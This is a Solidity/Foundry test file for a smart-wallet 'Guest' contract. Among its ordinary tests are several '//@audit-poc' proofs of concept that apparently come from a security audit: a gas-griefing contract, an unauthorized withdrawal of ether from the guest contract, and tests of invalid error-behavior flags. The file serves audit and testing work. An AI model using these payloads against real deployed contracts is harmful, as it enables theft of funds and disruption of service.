// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.27;

import { Guest } from "../src/Guest.sol";

import { Calls } from "../src/modules/Calls.sol";
import { Payload } from "../src/modules/Payload.sol";
import { PrimitivesRPC } from "./utils/PrimitivesRPC.sol";
import { AdvTest } from "./utils/TestUtils.sol";
import { console2 } from "forge-std/console2.sol";

struct GuestPayload {
  bool noChainId;
  Payload.Call[] calls;
  uint160 space;
  uint56 nonce;
}

function toDecodedGuestPayload(
  GuestPayload memory p
) pure returns (Payload.Decoded memory d) {
  d.kind = Payload.KIND_TRANSACTIONS;
  d.calls = p.calls;
  d.space = p.space;
  d.nonce = p.nonce;
}

contract GasGriefer {

  uint256[] private data;

  function expensiveStorage() external {
    // Write to storage - very expensive (~20,000 gas per write)
    for (uint256 i = 0; i < 1000; i++) {
      data.push(i); // ~20,000 gas per push
    }

    // Additional expensive operations
    for (uint256 i = 0; i < data.length; i++) {
      data[i] = data[i] * 2; // ~5,000 gas per update
    }
  }

}

contract GuestTest is AdvTest {

  Guest public guest;

  event CallSucceeded(bytes32 _opHash, uint256 _index);
  event CallFailed(bytes32 _opHash, uint256 _index, bytes _returnData);
  event CallAborted(bytes32 _opHash, uint256 _index, bytes _returnData);
  event CallSkipped(bytes32 _opHash, uint256 _index);

  function setUp() external {
    guest = new Guest();
  }

  function test_fallback(
    GuestPayload memory p
  ) external {
    vm.assume(p.calls.length < 5 && p.calls.length > 0);
    Payload.Decoded memory decoded = toDecodedGuestPayload(p);
    boundToLegalPayload(decoded);
    for (uint256 i = 0; i < decoded.calls.length; i++) {
      decoded.calls[i].to = boundNoPrecompile(decoded.calls[i].to);
      decoded.calls[i].value = 0; // No ETH transfers allowed
      decoded.calls[i].delegateCall = false; // No delegate calls allowed
      decoded.calls[i].behaviorOnError = bound(decoded.calls[i].behaviorOnError, 0, 2);
      decoded.calls[i].gasLimit = bound(decoded.calls[i].gasLimit, 0, 1_000_000_000);
    }

    bytes memory packed = PrimitivesRPC.toPackedPayload(vm, decoded);

    bytes32 opHash = Payload.hashFor(decoded, address(guest));
    for (uint256 i = 0; i < decoded.calls.length; i++) {
      if (decoded.calls[i].onlyFallback) {
        vm.expectEmit(true, true, true, true);
        emit CallSkipped(opHash, i);
      } else {
        vm.expectCall(decoded.calls[i].to, decoded.calls[i].data);
        // vm.expectEmit(true, true, true, true);
        // emit CallSucceeded(opHash, i);
      }
    }
    (bool ok,) = address(guest).call(packed);
    assertTrue(ok);
  }

  //@audit-poc
  function test_guest_fallback_with_gas_griefing_attack() external {
    uint8 globalFlag = 0x11; // 00010001 binary
    address randomAddress = makeAddr("random address");
    address[] memory parentWallets = new address[](0);
    Payload.Call[] memory calls = new Payload.Call[](1);
    GasGriefer gasGriefer = new GasGriefer();
    calls[0] = Payload.Call({
      to: address(gasGriefer),
      value: uint256(0),
      data: bytes(""),
      gasLimit: uint256(0),
      delegateCall: false,
      onlyFallback: false,
      behaviorOnError: uint256(3)
    });
    Payload.Decoded memory decodedNew = Payload.Decoded({
      kind: Payload.KIND_TRANSACTIONS,
      noChainId: false,
      // Transaction kind
      calls: calls,
      space: uint256(0),
      nonce: uint256(0),
      // Message kind
      message: bytes(""),
      // Config update kind
      imageHash: bytes32(0),
      // Digest kind for 1271
      digest: bytes32(0),
      // Parent wallets
      parentWallets: parentWallets
    });
    // Call flags = 0xC0 to 0xC3 for behaviorOnError = 3
    // We want self call to avoid providing address, so bit 0 = 1
    // behaviorOnError = 3 → bits 6-7 = 11
    // So: 11000001 = 0xC1
    uint8 callFlags = 0xC2; // Self call + behaviorOnError = 3
    bytes memory packed = abi.encodePacked(
      uint8(globalFlag), // 0x11
      uint8(callFlags), // 0xC2
      randomAddress,
      uint256(100000000000000000) //0.1 ether
    );

    bytes32 opHash = Payload.hashFor(decodedNew, address(guest));
    vm.expectEmit(true, true, true, true);
    emit CallSucceeded(opHash, 0);
    vm.prank(address(guest));
    (bool ok,) = address(guest).call(packed);
    assertTrue(ok);
  }

  function test_fallback_Success_With_Invalid_Behavior_On_Error_set_as_3() external {
    uint8 globalFlag = 0x11; // 00010001 binary
    address randomAddress = makeAddr("random address");
    address[] memory parentWallets = new address[](0);
    Payload.Call[] memory calls = new Payload.Call[](1);
    calls[0] = Payload.Call({
      to: randomAddress,
      value: uint256(100000000000000000),
      data: bytes(""),
      gasLimit: uint256(0),
      delegateCall: false,
      onlyFallback: false,
      behaviorOnError: uint256(3)
    });
    Payload.Decoded memory decodedNew = Payload.Decoded({
      kind: Payload.KIND_TRANSACTIONS,
      noChainId: false,
      // Transaction kind
      calls: calls,
      space: uint256(0),
      nonce: uint256(0),
      // Message kind
      message: bytes(""),
      // Config update kind
      imageHash: bytes32(0),
      // Digest kind for 1271
      digest: bytes32(0),
      // Parent wallets
      parentWallets: parentWallets
    });
    // Call flags = 0xC0 to 0xC3 for behaviorOnError = 3
    // We want self call to avoid providing address, so bit 0 = 1
    // behaviorOnError = 3 → bits 6-7 = 11
    // So: 11000001 = 0xC1
    uint8 callFlags = 0xC2; // Self call + behaviorOnError = 3
    bytes memory packed = abi.encodePacked(
      uint8(globalFlag), // 0x11
      uint8(callFlags), // 0xC2
      randomAddress,
      uint256(100000000000000000)
    );

    bytes32 opHash = Payload.hashFor(decodedNew, address(guest));
    vm.expectEmit(true, true, true, true);
    emit CallSucceeded(opHash, 0);
    vm.prank(address(guest));
    (bool ok,) = address(guest).call(packed);
    assertTrue(ok);
  }

  //@audit-poc
  function test_fallback_For_Funds_Withdrawal_By_UnAuthorized_Users() external {
    uint8 globalFlag = 0x11; // 00010001 binary
    address myAddress = makeAddr("my address");
    vm.deal(myAddress, 0);
    address[] memory parentWallets = new address[](0);
    Payload.Call[] memory calls = new Payload.Call[](1);
    calls[0] = Payload.Call({
      to: myAddress,
      value: uint256(10000000000000000000), //10 ether
      data: bytes(""),
      gasLimit: uint256(0),
      delegateCall: false,
      onlyFallback: false,
      behaviorOnError: uint256(0)
    });
    Payload.Decoded memory decodedNew = Payload.Decoded({
      kind: Payload.KIND_TRANSACTIONS,
      noChainId: false,
      // Transaction kind
      calls: calls,
      space: uint256(0),
      nonce: uint256(0),
      // Message kind
      message: bytes(""),
      // Config update kind
      imageHash: bytes32(0),
      // Digest kind for 1271
      digest: bytes32(0),
      // Parent wallets
      parentWallets: parentWallets
    });

    uint8 callFlags = 0x02; // call has only value
    bytes memory packed = abi.encodePacked(
      uint8(globalFlag), // 0x11
      uint8(callFlags), // 0x02
      myAddress,
      uint256(10000000000000000000) //10 ether
    );

    bytes32 opHash = Payload.hashFor(decodedNew, address(guest));
    vm.expectEmit(true, true, true, true);
    emit CallSucceeded(opHash, 0);
    uint256 guestInitialBalance = 20 ether;
    hoax(address(guest), guestInitialBalance);
    (bool ok,) = address(guest).call(packed);
    assertTrue(ok);
    assertEq(address(guest).balance, 10 ether, "Guest balance not reduced");
    assertEq(myAddress.balance, 10 ether, "Balance not received");
  }

  function test_notEnoughGas(GuestPayload memory p, uint256 callIndex) external {
    vm.assume(p.calls.length > 0);
    callIndex = bound(callIndex, 0, p.calls.length - 1);

    Payload.Decoded memory decoded = toDecodedGuestPayload(p);
    boundToLegalPayload(decoded);
    for (uint256 i = 0; i < decoded.calls.length; i++) {
      decoded.calls[i].to = boundNoPrecompile(decoded.calls[i].to);
      decoded.calls[i].value = 0;
      decoded.calls[i].delegateCall = false;
      if (i == callIndex) {
        // Only set high gas limit for the specified call
        uint256 gasLimit = bound(decoded.calls[i].gasLimit, gasleft() + 1, type(uint256).max);
        decoded.calls[i].gasLimit = gasLimit;
        decoded.calls[i].onlyFallback = false;
      } else {
        // Set normal gas limits for other calls
        decoded.calls[i].gasLimit = bound(decoded.calls[i].gasLimit, 0, 1_000_000_000);
      }
    }
    vm.expectRevert();
    bytes memory packed = PrimitivesRPC.toPackedPayload(vm, decoded);
    (bool ok,) = address(guest).call(packed);
    assertTrue(ok);
  }

  //@audit-poc
  function test_Call_Succeeded_With_Zero_GasLimit(GuestPayload memory p, uint256 callIndex) external {
    vm.assume(p.calls.length > 0);
    callIndex = bound(callIndex, 0, p.calls.length - 1);

    Payload.Decoded memory decoded = toDecodedGuestPayload(p);
    boundToLegalPayload(decoded);
    console2.log("decoded.calls: ", decoded.calls.length);
    for (uint256 i = 0; i < decoded.calls.length; i++) {
      decoded.calls[i].to = boundNoPrecompile(decoded.calls[i].to);
      decoded.calls[i].value = 0;
      decoded.calls[i].delegateCall = false;
      decoded.calls[i].gasLimit = 0;
    }

    bytes memory packed = PrimitivesRPC.toPackedPayload(vm, decoded);
    (bool ok,) = address(guest).call(packed);
    assertTrue(ok);
  }

  function test_delegateCallNotAllowed(GuestPayload memory p, uint256 callIndex) external {
    vm.assume(p.calls.length > 0);
    callIndex = bound(callIndex, 0, p.calls.length - 1);

    Payload.Decoded memory decoded = toDecodedGuestPayload(p);
    boundToLegalPayload(decoded);

    for (uint256 i = 0; i < decoded.calls.length; i++) {
      decoded.calls[i].to = boundNoPrecompile(decoded.calls[i].to);
      decoded.calls[i].value = 0;
      decoded.calls[i].gasLimit = bound(decoded.calls[i].gasLimit, 0, 1_000_000_000);

      if (i == callIndex) {
        // Set delegateCall to true for the specified call
        decoded.calls[i].delegateCall = true;
        decoded.calls[i].onlyFallback = false;
      } else {
        decoded.calls[i].delegateCall = false;
      }
    }

    bytes memory packed = PrimitivesRPC.toPackedPayload(vm, decoded);

    vm.expectRevert(abi.encodeWithSelector(Guest.DelegateCallNotAllowed.selector, callIndex));
    (bool ok,) = address(guest).call(packed);
    assertTrue(ok);
  }

  function test_callFailsWithIgnoreBehavior(GuestPayload memory p, uint256 callIndex) external {
    vm.assume(p.calls.length > 0);
    callIndex = bound(callIndex, 0, p.calls.length - 1);

    Payload.Decoded memory decoded = toDecodedGuestPayload(p);
    boundToLegalPayload(decoded);

    decoded.calls[callIndex].to = boundNoPrecompile(decoded.calls[callIndex].to);
    address failureAddress = decoded.calls[callIndex].to;
    bytes32 failureDataHash = keccak256(decoded.calls[callIndex].data);

    for (uint256 i = 0; i < decoded.calls.length; i++) {
      decoded.calls[i].to = boundNoPrecompile(decoded.calls[i].to);
      decoded.calls[i].value = 0;
      decoded.calls[i].delegateCall = false;
      decoded.calls[i].gasLimit = bound(decoded.calls[i].gasLimit, 0, 1_000_000_000);

      if (i == callIndex) {
        decoded.calls[i].behaviorOnError = Payload.BEHAVIOR_IGNORE_ERROR;
        decoded.calls[i].onlyFallback = false;
      } else if (decoded.calls[i].to == failureAddress) {
        decoded.calls[i].behaviorOnError = Payload.BEHAVIOR_IGNORE_ERROR;
      }
    }

    bytes memory packed = PrimitivesRPC.toPackedPayload(vm, decoded);
    bytes32 opHash = Payload.hashFor(decoded, address(guest));

    // Mock the call to fail with some revert data
    bytes memory revertData = abi.encodeWithSignature("Error(string)", "Test error");
    vm.mockCallRevert(decoded.calls[callIndex].to, decoded.calls[callIndex].data, revertData);

    bool errorFlag = false;
    for (uint256 i = 0; i < decoded.calls.length; i++) {
      vm.expectEmit(true, true, true, true);

      if (!errorFlag && decoded.calls[i].onlyFallback) {
        emit CallSkipped(opHash, i);
      } else if (decoded.calls[i].to == failureAddress && keccak256(decoded.calls[i].data) == failureDataHash) {
        emit CallFailed(opHash, i, revertData);
        errorFlag = true;
      } else {
        emit CallSucceeded(opHash, i);
        vm.expectCall(decoded.calls[i].to, decoded.calls[i].data);
        errorFlag = false;
      }
    }

    (bool ok,) = address(guest).call(packed);
    assertTrue(ok);
  }

  function test_callFailsWithRevertBehavior(GuestPayload memory p, uint256 callIndex) external {
    vm.assume(p.calls.length > 0);
    callIndex = bound(callIndex, 0, p.calls.length - 1);

    Payload.Decoded memory decoded = toDecodedGuestPayload(p);
    boundToLegalPayload(decoded);

    decoded.calls[callIndex].to = boundNoPrecompile(decoded.calls[callIndex].to);

    for (uint256 i = 0; i < decoded.calls.length; i++) {
      decoded.calls[i].to = boundNoPrecompile(decoded.calls[i].to);
      decoded.calls[i].value = 0;
      decoded.calls[i].delegateCall = false;
      decoded.calls[i].gasLimit = bound(decoded.calls[i].gasLimit, 0, 1_000_000_000);

      if (decoded.calls[i].to == decoded.calls[callIndex].to && i != callIndex) {
        decoded.calls[i].behaviorOnError = Payload.BEHAVIOR_IGNORE_ERROR;
      }

      if (i == callIndex) {
        decoded.calls[i].behaviorOnError = Payload.BEHAVIOR_REVERT_ON_ERROR;
        decoded.calls[i].onlyFallback = false;
      }
    }

    bytes memory packed = PrimitivesRPC.toPackedPayload(vm, decoded);

    // Mock the call to fail with some revert data
    bytes memory revertData = abi.encodeWithSignature("Error(string)", "Test error");
    vm.mockCallRevert(decoded.calls[callIndex].to, decoded.calls[callIndex].data, revertData);

    // Expect the revert
    vm.expectRevert(abi.encodeWithSelector(Calls.Reverted.selector, decoded, callIndex, revertData));

    (bool ok,) = address(guest).call(packed);
    assertTrue(ok);
  }

  function test_callFailsWithAbortBehavior(GuestPayload memory p, uint256 callIndex) external {
    vm.assume(p.calls.length > 0);
    callIndex = bound(callIndex, 0, p.calls.length - 1);

    Payload.Decoded memory decoded = toDecodedGuestPayload(p);
    boundToLegalPayload(decoded);

    decoded.calls[callIndex].to = boundNoPrecompile(decoded.calls[callIndex].to);

    for (uint256 i = 0; i < decoded.calls.length; i++) {
      decoded.calls[i].to = boundNoPrecompile(decoded.calls[i].to);
      decoded.calls[i].value = 0;
      decoded.calls[i].delegateCall = false;
      decoded.calls[i].gasLimit = bound(decoded.calls[i].gasLimit, 0, 1_000_000_000);

      if (decoded.calls[i].to == decoded.calls[callIndex].to && i != callIndex) {
        decoded.calls[i].behaviorOnError = Payload.BEHAVIOR_IGNORE_ERROR;
      }

      if (i == callIndex) {
        decoded.calls[i].behaviorOnError = Payload.BEHAVIOR_ABORT_ON_ERROR;
        decoded.calls[i].onlyFallback = false;
      }
    }

    bytes memory packed = PrimitivesRPC.toPackedPayload(vm, decoded);
    bytes32 opHash = Payload.hashFor(decoded, address(guest));

    // Mock the call to fail with some revert data
    bytes memory revertData = abi.encodeWithSignature("Error(string)", "Test error");
    vm.mockCallRevert(decoded.calls[callIndex].to, decoded.calls[callIndex].data, revertData);

    // Expect the abort event
    vm.expectEmit(true, true, true, true);
    emit CallAborted(opHash, callIndex, revertData);

    (bool ok,) = address(guest).call(packed);
    assertTrue(ok);
  }

  function test_forwardPayment(uint256 _value1, uint256 _value2) external {
    address to1 = address(0x100001);
    address to2 = address(0x100002);

    _value1 = bound(_value1, 0, type(uint128).max);
    _value2 = bound(_value2, 0, type(uint128).max);

    Payload.Decoded memory payload;
    payload.kind = Payload.KIND_TRANSACTIONS;
    payload.calls = new Payload.Call[](2);
    payload.calls[0].to = to1;
    payload.calls[0].value = _value1;
    payload.calls[1].to = to2;
    payload.calls[1].value = _value2;

    bytes memory packed = PrimitivesRPC.toPackedPayload(vm, payload);

    uint256 total = _value1 + _value2;
    vm.deal(address(this), total);
    (bool ok,) = address(guest).call{ value: total }(packed);
    assertTrue(ok);

    assertEq(address(this).balance, 0);

    assertEq(address(to1).balance, _value1);
    assertEq(address(to2).balance, _value2);
  }

}
